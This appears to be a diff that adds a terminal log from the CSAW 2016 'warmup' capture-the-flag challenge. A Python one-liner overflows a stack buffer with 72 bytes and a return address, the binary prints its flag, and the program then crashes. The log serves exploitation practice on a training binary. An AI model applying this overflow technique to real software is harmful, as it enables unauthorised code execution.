@@ -1,0 +1,6 @@
+user@User-Pc:~/home/GIT/IVAN/Pwning/Nightmare/stackOverflow/CSAW16-WARMUP$ python -c 'print "0"*72 + "\x0d\x06\x40\x00\x00\x00\x00\x00"+"\x0d\x06\x40\x00\x00\x00\x00\x00"' |./warmup
+-Warm Up-
+WOW:0x40060d
+>flag{g0ttem_b0yz}
+Segmentation fault
+
